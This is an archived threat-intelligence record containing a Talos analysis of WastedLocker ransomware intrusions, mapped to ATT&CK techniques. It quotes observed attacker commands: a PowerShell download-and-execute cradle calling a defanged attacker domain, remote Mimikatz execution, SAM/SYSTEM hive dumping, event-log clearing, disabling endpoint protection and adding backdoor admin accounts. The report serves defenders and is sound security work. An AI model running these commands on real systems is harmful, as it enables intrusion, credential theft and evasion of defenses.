{
    "id": "a3d7f31e-8495-48f1-83b4-42e30c063e37",
    "created_at": "2023-01-12T15:10:56.282204Z",
    "updated_at": "2025-03-27T02:13:16.717746Z",
    "deleted_at": null,
    "sha1_hash": "5f0b8563b89d6631e170bd56a15d0be4bf05abb4",
    "title": "2020-07-06 - WastedLocker Goes Big-Game Hunting in 2020",
    "authors": "",
    "file_creation_date": "2022-05-27T21:11:02Z",
    "file_modification_date": "2022-05-27T21:11:02Z",
    "file_size": 699402,
    "plain_text": "# WastedLocker Goes \"Big-Game Hunting\" in 2020\n\n**[blog.talosintelligence.com/2020/07/wastedlocker-emerges.html](https://blog.talosintelligence.com/2020/07/wastedlocker-emerges.html)**\n\n## Threat summary\n\nAfter initially compromising corporate networks, the attacker behind WastedLocker\nperforms privilege escalation and lateral movement prior to activating ransomware and\ndemanding ransom payment\n\n\n-----\n\nThe use of dual-use tools and LoLBins enables adversaries to evade detection and\nstay under the radar as they further operate towards their objectives in corporate\nenvironments.\nWastedLocker is one of the latest examples of adversaries' continued use of lateral\nmovement and privilege escalation to maximize the damage caused by ransomware.\nThe use of \"big-game hunting\" continues to cause significant operational and financial\ndamages to organizations around the globe.\n\n## Background\n\nRansomware is a serious threat to organizations around the world. It is used to disrupt\noperations on computing systems so that attackers can extort victims and demand payment,\ntypically in the form of cryptocurrency, to restore normal operations on infected systems. As\nthe threat actors behind ransomware attacks have matured in their capabilities, they have\nrefined their approach to generating revenue using this business model. One recent\nevolution has been the use of privilege escalation and lateral movement techniques prior to\nthe activation of ransomware payloads within organizational environments.\n\nBy delivering and activating ransomware on many different systems within corporate\nnetworks simultaneously, attackers can maximize the damage they inflict. This often results\nin a situation where organizations may be more likely to pay a ransom demand than they\notherwise would have been, had only a single endpoint been affected. In some cases\norganizational backup and recovery strategies may not have been adequately tested against\nsituations in which a significant portion of their production environment is adversely affected\nat the same time, which may cause them to be more willing to pay a ransom demand. It also\nallows adversaries to increase the amount of the ransom they are demanding, often resulting\nin ransom demands for hundreds of thousands of dollars or more to recover infected\n[systems. This approach is sometimes referred to as \"big-game hunting.\"](https://open.spotify.com/episode/2q62vw5A9FEmQzREZ7cnSX)\n\nAdversaries have used this approach more frequently over the past year. One of the most\nrecent examples of this is with the emergence of a threat actor that is currently leveraging a\nransomware family known as \"WastedLocker.\" The adversary behind these attacks is taking\n[advantage of various \"dual-use\" toolsets like Cobalt Strike,](https://www.cobaltstrike.com/) [Mimikatz,](https://github.com/gentilkiwi/mimikatz) [Empire, and](https://github.com/EmpireProject/Empire)\n[PowerSploit to facilitate lateral movement across environments being targeted. These](https://github.com/PowerShellMafia/PowerSploit)\ntoolsets are typically developed to aid with penetration testing or red-teaming activities, but\ntheir use is often co-opted by malicious adversaries as well. Additionally, the use of native\n[operating system functionality, and what are commonly referred to as \"LoLBins\" allows](https://blog.talosintelligence.com/2019/11/hunting-for-lolbins.html)\n[attackers to evade detection and operate under the radar until they are ready to activate the](https://blog.talosintelligence.com/2020/02/building-bypass-with-msbuild.html)\nransomware and make their presence known.\n\n\n-----\n\n## Technical details\n\n[Multiple reports have been published recently detailing activity associated with](https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/)\nWastedLocker attacks. The focus of this post will be on dissecting the various phases of\nthese attacks and describing the tactics, techniques, and procedures that Cisco Talos has\nobserved the threat actor behind WastedLocker using within target environments for the\npurposes of maximizing their sphere of influence within the network and facilitating the\nactivation of ransomware across the environment.\n\n### Initial access and compromise\n\n[ATT&CK Technique: Drive-By Compromise (T1189)](https://attack.mitre.org/techniques/T1189/)\n\nAs described in previous reporting, the initial compromise appears to be related to fake\nGoogle Chrome updates that are delivered to victims via drive-by download attacks when\nvictims browse compromised websites. The initial malware is delivered to victims in the form\nof a ZIP archive that contains a malicious JavaScript file. The malicious JavaScript is then\nexecuted using wscript.exe to initiate the infection process.\n```\nC:\\Windows\\System32\\WScript.exe C:\\Users\\\n<USERNAME>\\AppData\\Local\\Temp\\Temp1_Chrome.Update.b343b0.zip\\Chrome.Update.c9a747.js\n\n```\nThe threat actor also makes use of Cobalt Strike payloads to perform command execution,\nprocess injection, privilege escalation, and process impersonation on infected systems. It is\nalso used to dump credentials on the system which may be used to authenticate to other\nsystems on the compromised network to facilitate further lateral movement activities.\n\n### Execution\n\n[ATT&CK Technique: PowerShell (T1086)](https://attack.mitre.org/techniques/T1086/)\n\n[ATT&CK Technique: Service Execution (T1035)](https://attack.mitre.org/techniques/T1035/)\n\n**PowerShell Execution Policy**\n\nThe PowerShell execution policy was set to \"RemoteSigned\" which allows locally created\nPowerShell scripts to be executed without requiring them to be signed.\n```\npowershell /c Set-ExecutionPolicy RemoteSigned\n\n```\n**Remote Command Execution**\n\nThe PSExec utility established command execution on remote systems within the\nenvironment.\n\n\n-----\n\n```\npsexec s \\\\<HOSTNAME>|<IP_ADDRESS> cmd\n\n### Lateral movement\n\n```\n[ATT&CK Technique: Windows Management Instrumentation (T1047)](https://attack.mitre.org/techniques/T1047/)\n\n[ATT&CK Technique: Windows Admin Shares (T1077)](https://attack.mitre.org/techniques/T1077/)\n\nLateral movement is performed by leveraging the Windows Management Instrumentation\n(WMI) command line utility (wmic.exe) to facilitate command execution on remote systems.\nThis functionality is used to download remotely hosted PowerShell scripts that can be\npassed to the Invoke-Expression (IEX) cmdlet and executed across the network. An example\nof this activity is below:\n```\nC:\\Windows\\System32\\Wbem\\WMIC.exe /node:<IP_ADDRESS> process call create cmd /c\npowershell -nop -exec bypass -c IEX (New-Object\nNet.WebClient).DownloadString('hxxp://cofeedback[.]com/download/4uth');jgifjgtebcndpgj\n 19172\n\n```\nThe attacker leverages administrative shares within Windows, specifically the ADMIN$\nshare, to move data between systems across the compromised network.\n\n### Credential dumping\n\n[ATT&CK Technique: Credential Dumping (T1003)](https://attack.mitre.org/techniques/T1003/)\n\n[ATT&CK Technique: Credentials In Registry (T1214)](https://attack.mitre.org/techniques/T1214/)\n\nIn most domain environments, Windows credentials can be used to authenticate to various\nsystems across the network. Malicious attackers often dump cached credentials on systems\nthey successfully compromise so that they can be used to remotely authenticate to other\nsystems within the same security boundary or domain. The attacker behind WastedLocker\nhas been observed using multiple techniques for retrieving cached credentials on systems\nunder their control.\n\nCisco Talos has observed this adversary leveraging Cobalt Strike to dump credentials using\n[Procdump which is part of the SysInternals Suite from Microsoft.](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)\n\nAdditionally, registry-based credential retrieval is performed by extracting the contents of the\nfollowing registry locations using the \"reg save\" command.\n```\nreg save HKLM\\SAM C:\\programdata\\SamBkup.hiv\nreg save HKLM\\SYSTEM C:\\programdata\\FileName.hiv\n\n```\n[The adversary was also observed leveraging Mass-Mimikatz, a component of](https://github.com/PowerShellEmpire/PowerTools/blob/master/PewPewPew/Invoke-MassMimikatz.ps1) [Empire that](https://github.com/PowerShellEmpire)\nallows attackers to execute Mimikatz on multiple systems over the network. This is\nperformed by using WMI to spawn the creation of a new PowerShell process. This\nPowerShell process is used to retrieve the MassMimikatz module from GitHub and pass it to\n\n\n-----\n\nIEX for execution along with parameters. The parameters are then used to facilitate the\nretrieval of credentials from remote systems.\n```\nC:\\WINDOWS\\SYSTEM32\\WBEM\\WMIC.exe /node:localhost process call create powershell /c\nIEX (New-Object \nNet.WebClient).DownloadString('https://raw.githubusercontent[.]com/PowerShellEmpire/Po\nMassMimikatz.ps1');'24346D,\nCOMPUTERNAME2'|Invoke-MassMimikatz -Verbose > c:/programdata/2.txt\n\n```\nPrior reporting has indicated that this adversary is no longer leveraging Empire, however\nCisco Talos has observed continued use of components of this toolset in active attacks.\nWhile the original Empire project is no longer under active development, it has since been\n[forked and development on the new project continues. In this case however, the attacker](https://github.com/BC-SECURITY/Empire)\ncontinues to leverage modules retrieved from the original project repositories.\n\nAs previously described the attacker has the capability of leveraging multiple techniques for\nretrieving credentials that may be reused on the network. In many cases this is the most\neffective and efficient way to move laterally and can often result in escalation of privileges\nwithin a domain environment if attackers can obtain privileged credentials like service\naccounts or those used for administrative purposes.\n\n### Discovery\n\n[ATT&CK Technique: Account Discovery (T1087)](https://attack.mitre.org/techniques/T1087/)\n\n[ATT&CK Technique: Process Discovery (T1057)](https://attack.mitre.org/techniques/T1057/)\n\n[ATT&CK Technique: Remote System Discovery (T1018)](https://attack.mitre.org/techniques/T1018/)\n\n[ATT&CK Technique: System Information Discovery (T1082)](https://attack.mitre.org/techniques/T1082/)\n\nAfter successfully compromising the environment, the adversary performed various activities\non systems under their control to obtain further information about the system as well as the\nenvironment in which the system is located. This post-compromise discovery process allows\nattackers to identify how the environment is configured as well as additional targets for lateral\nmovement as they continue to operate towards their longer-term objectives. It is important to\nnote that the discovery and enumeration activities observed in this section were all\nperformed via manual operator activities conducted on systems, not via scripting or other\nautomated methods. In several cases, the attacker attempted to execute command line\nsyntax containing typographical errors, followed immediately by corrections to the syntax and\nsubsequent command execution. Some examples of various discovery and enumeration\nactivities are outlined below.\n\n**Account and Privilege Enumeration**\n```\nC:\\Windows\\System32\\cmd.exe /C whoami /all >> C:\\Users\\\n<USERNAME>\\AppData\\Local\\Temp\\rad971D8.tmp\nC:\\WINDOWS\\system32\\net.exe user <USERNAME> /domain\n\n```\n\n-----\n\n```\nC:\\WINDOWS\\system32\\net1 user <USERNAME> /domain\nC:\\WINDOWS\\system32\\cmd.exe /C quser\nC:\\WINDOWS\\system32\\quser.exe /server:<IP_ADDRESS>\nC:\\Windows\\system32\\cmd.exe /C qwinsta\nC:\\WINDOWS\\system32\\qwinsta.exe /server:<IP_ADDRESS>\n\n```\n**Group Membership Enumeration**\n```\nC:\\Windows\\System32\\cmd.exe /C net group domain admins /domain >> C:\\Users\\\n<USERNAME>\\AppData\\Local\\Temp\\rad65F1C.tmp\n\n```\n**System/Domain Trust Enumeration**\n```\nC:\\Windows\\system32\\cmd.exe /C nltest /dclist:<DOMAIN|IP_ADDRESS>\n\n```\n**Local System Enumeration**\n```\nC:\\Windows\\system32\\cmd.exe /C systeminfo | findstr /B /C:OS Name /C:OS Version\npowershell.exe (Get-WmiObject -Query 'SELECT Caption FROM\nWin32_OperatingSystem').Caption\nwmic path win32_operatingsystem get caption\n\n```\n**Local Service Enumeration**\n```\nsc queryex type= service\nC:\\Windows\\System32\\cmd.exe /C net start >> C:\\Users\\\n<USERNAME>\\AppData\\Local\\Temp\\rad38FFC.tmp\nC:\\Windows\\system32\\net1 start\nC:\\Windows\\system32\\cmd.exe /C powershell Get-WmiObject win32_service -ComputerName\nlocalhost | Where-Object {$_.PathName -notmatch c:\\\\win} | select Name, DisplayName,\nState, PathName | findstr Running\npowershell Get-WmiObject win32_service -ComputerName localhost\n\n```\n**Network and Shared Folder Enumeration**\n```\nC:\\WINDOWS\\system32\\cmd.exe /C net use\nC:\\WINDOWS\\system32\\cmd.exe /C dir \\\\<IP_ADDRESS>\\c$\nC:\\Windows\\system32\\cmd.exe /C dir \\\\<HOSTNAME>\\c$\\programdata\nC:\\WINDOWS\\system32\\cmd.exe /C ping -n 1 <HOSTNAME>\n\n```\n\n-----\n\n**Network Connectivity/Egress Testing**\n```\nC:\\Windows\\system32\\cmd.exe /C ping -n 1 cofeedback[.]com\n\n### Defense Evasion\n\n```\n[ATT&CK Technique: Indicator Removal on Host (T1070)](https://attack.mitre.org/techniques/T1070/)\n\n[ATT&CK Technique: Disabling Security Tools (T1089)](https://attack.mitre.org/techniques/T1089/)\n\n[ATT&CK Technique: Compile After Delivery (T1500)](https://attack.mitre.org/techniques/T1500/)\n\n[ATT&CK Technique: Trusted Developer Utilities (T1127)](https://attack.mitre.org/techniques/T1127/)\n\n[The attacker leverages the msbuild.exe LoLBin — previously described by Cisco](https://lolbas-project.github.io/)\n[Talos here — to evade endpoint detection and execute the Cobalt Strike payloads. The](https://blog.talosintelligence.com/2020/02/building-bypass-with-msbuild.html)\nfollowing are examples of msbuild being used to execute these payloads.\n```\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\msbuild.exe\",\"C:\\\\Programdata\\\\\\\\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\msbuild.exe\",\"C:\\\\Programdata\\\\\\\\\n\n```\nFollowing operator interaction with systems, the adversary used PsExec to invoke the\n\"wevtutil.exe\" utility. This utility cleared the contents of local security event logs on systems.\nRather than selectively removing specific log entries and \"timestomping\" or manipulating the\ntimestamps associated with the logs, the adversary simply cleared the entire contents of the\nlog files. In addition to clearing log entries, the adversary was also observed disabling\nendpoint security software deployed on systems under their control. Some example of this is\nbelow:\n\n**Clearing Log Entries**\n```\nPsExec.exe -s \\\\localhost cmd /c for /F tokens=* %1 in ('wevtutil.exe el') DO\nwevtutil.exe cl %1\n\n```\n**Stopping & Disabling Endpoint Protection**\n\nSeveral attempts were made to disable security protections deployed on endpoint systems,\nincluding Symantec Endpoint Protection, Windows Defender, and Cisco AMP for Endpoints.\n\n**Attempted to Disable Symantec Endpoint Protection**\n```\nC:\\WINDOWS\\system32\\cmd.exe /c C:\\Program Files (x86)\\Symantec\\Symantec Endpoint\nProtection\\14.2.5323.2000.105\\Bin\\Smc.exe -stop\nC:\\Program Files (x86)\\Symantec\\Symantec Endpoint\nProtection\\14.2.5323.2000.105\\Bin\\Smc.exe -disable -sep\n\n```\n**Attempting to Disable Cisco AMP for Endpoints**\n\n\n-----\n\n```\nC:\\Windows\\system32\\taskkill.exe /F /IM sfc.exe\nC:\\Windows\\system32\\cmd.exe /C C:\\Program Files\\Cisco\\AMP\\7.2.7\\sfc.exe -stop\n\n```\n**Attempting to Disable Windows Defender Features**\n```\nC:\\Program Files\\Windows Defender\\MpCmdRun.exe -RemoveDefinitions -All SetMpPreference -DisableIOAVProtection $true\n\n```\nThe adversary also frequently leveraged .NET runtime compilation when delivering payloads\nto additional systems within the compromised environment.\n\n**.NET Runtime Compilation**\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY\n/MACHINE:IX86 /OUT:C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\RESF8F4.tmp c:\\Users\\\n<USERNAME>\\AppData\\Local\\Temp\\h4bie4kg\\CSC81E10858D57A44649763EE5728D5E87.TMP\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths\n@C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\h4bie4kg\\h4bie4kg.cmdline\n\n### Persistence\n\n```\n[ATT&CK Technique: Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/)\n\nA common mechanism used by attackers to achieve a persistent ability to access systems\nwithin compromised environments is the creation of backdoor accounts that can be\nsubsequently used by the attacker to access systems under their control following initial\ncompromise. We observed the adversary attempting to establish local administrative\naccounts on systems that could be used for this purpose.\n```\nC:\\WINDOWS\\system32\\cmd.exe /C net user Admim <PASSWORD> /ADD\nC:\\WINDOWS\\system32\\cmd.exe /C net localgroup Administrators Admim /ADD\n\n### Collection Activity\n\n```\n[ATT&CK Technique: Screen Capture (T1113)](https://attack.mitre.org/techniques/T1113/)\n\nWMI is also used to execute a PowerShell process on remote systems across the network.\nThe Invoke-Expression (IEX) cmdlet retrieves the PowerSploit module \"GetTimedScreenshot\" from its GitHub repository and executes it on the remote system to\ncapture screenshots of the remote system every 30 seconds.\n```\nC:\\Windows\\System32\\Wbem\\WMIC.exe /node:<REMOTE_IP> process call create powershell /c\nIEX (New-Object \nSystem.Net.Webclient).DownloadString('https://raw.githubusercontent[.]com/PowerShellMa\nTimedScreenshot.ps1');Get-TimedScreenshot\n-Path c:\\programdata\\ -Interval 30\n\n```\n\n-----\n\nThe collected screenshots are saved under the %PROGRAMDATA% directory on the remote\nsystem for later retrieval.\n\n## Conclusion\n\nThese tactics, techniques and procedures used by the threat actor behind WastedLocker\ndemonstrate how these sorts of attacks are taking place across organizational environments.\nOrganizations should be aware of how attackers are moving laterally, escalating privileges,\nand then using the elevated access to large portions of the environment to maximize the\neffectiveness of the ransomware payloads that they are deploying. It is not always enough to\nsimply deploy perimeter security, organizations should also ensure that they have layered\nsecurity to ensure that they prevent, detect and respond to malicious activity that may be\nconducted within the organization's network following attacks that are successful at\ncompromising perimeter security defenses. Additionally, organizations should ensure that\ntheir backup and recovery strategies are tested against a variety of different scenarios that\nmay disrupt business operations to ensure that they can recover even in situations where\nlarge percentages of systems or infrastructure are affected at the same time. Adversaries are\nconstantly seeking to improve upon their strategies for achieving their mission objectives and\nwe will likely continue to observe these refinements across the threat landscape.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\n\n\n-----\n\nmalware used by these threat actors. Exploit Prevention present within AMP is designed to\nprotect customers from unknown attacks such as this automatically.\n\n[Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html)\naccess to malicious websites and detects malware used in these attacks.\n\n[Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\n[Intrusion Prevention System (NGIPS), Cisco ISR, and Meraki MX.](https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html)\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\nproducts.\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs, and URLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.snort.org/products)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-06 - WastedLocker Goes Big-Game Hunting in 2020.pdf"
    ],
    "report_names": [
        "2020-07-06 - WastedLocker Goes Big-Game Hunting in 2020.pdf"
    ],
    "threat_actors": [
        {
            "id": "6c4f98b3-fe14-42d6-beaa-866395455e52",
            "created_at": "2023-01-06T13:46:39.169554Z",
            "updated_at": "2025-03-27T02:00:03.011739Z",
            "deleted_at": null,
            "main_name": "Evil Corp",
            "aliases": [
                "GOLD DRAKE"
            ],
            "source_name": "MISPGALAXY:Evil Corp",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "50068c14-343c-4491-b568-df41dd59551c",
            "created_at": "2022-10-25T15:50:23.253218Z",
            "updated_at": "2025-03-27T02:00:55.408128Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Indrik Spider",
                "Evil Corp",
                "Manatee Tempest",
                "DEV-0243",
                "UNC2165"
            ],
            "source_name": "MITRE:Indrik Spider",
            "tools": [
                "Mimikatz",
                "PsExec",
                "Dridex",
                "WastedLocker",
                "BitPaymer",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
            "created_at": "2022-10-25T16:07:23.73153Z",
            "updated_at": "2025-03-27T02:02:09.950784Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Blue Lelantos",
                "DEV-0243",
                "Evil Corp",
                "Gold Drake",
                "Gold Winter",
                "Manatee Tempest",
                "UNC2165"
            ],
            "source_name": "ETDA:Indrik Spider",
            "tools": [
                "Advanced Port Scanner",
                "Agentemis",
                "Babuk",
                "Babuk Locker",
                "Babyk",
                "BitPaymer",
                "Bugat",
                "Bugat v5",
                "Cobalt Strike",
                "CobaltStrike",
                "Cridex",
                "Dridex",
                "EmPyre",
                "EmpireProject",
                "FAKEUPDATES",
                "FakeUpdate",
                "Feodo",
                "FriedEx",
                "Hades",
                "IEncrypt",
                "LINK_MSIEXEC",
                "MEGAsync",
                "Macaw Locker",
                "Metasploit",
                "Mimikatz",
                "PayloadBIN",
                "Phoenix Locker",
                "PowerShell Empire",
                "PowerSploit",
                "PsExec",
                "QNAP-Worm",
                "Raspberry Robin",
                "RaspberryRobin",
                "SocGholish",
                "Vasa Locker",
                "WastedLoader",
                "WastedLocker",
                "cobeacon",
                "wp_encrypt"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b296f34c-c424-41da-98bf-90312a5df8ef",
            "created_at": "2024-06-19T02:03:08.027585Z",
            "updated_at": "2025-03-27T02:05:17.350153Z",
            "deleted_at": null,
            "main_name": "GOLD DRAKE",
            "aliases": [
                "Indrik Spider ",
                "Evil Corp"
            ],
            "source_name": "Secureworks:GOLD DRAKE",
            "tools": [
                " Cobalt Strike",
                " Covenant",
                " Donut",
                " Dridex",
                " Hades",
                " Koadic",
                " LockBit",
                " Macaw Locker",
                " Mimikatz",
                " Payload.Bin",
                " Phoenix CryptoLocker",
                " PowerSploit",
                " Powershell Empire",
                " SocGholish",
                " WastedLocker",
                "BitPaymer"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536256,
    "ts_updated_at": 1743041596,
    "ts_creation_date": 1653685862,
    "ts_modification_date": 1653685862,
    "files": {
        "pdf": "https://archive.orkl.eu/5f0b8563b89d6631e170bd56a15d0be4bf05abb4.pdf",
        "text": "https://archive.orkl.eu/5f0b8563b89d6631e170bd56a15d0be4bf05abb4.txt",
        "img": "https://archive.orkl.eu/5f0b8563b89d6631e170bd56a15d0be4bf05abb4.jpg"
    }
}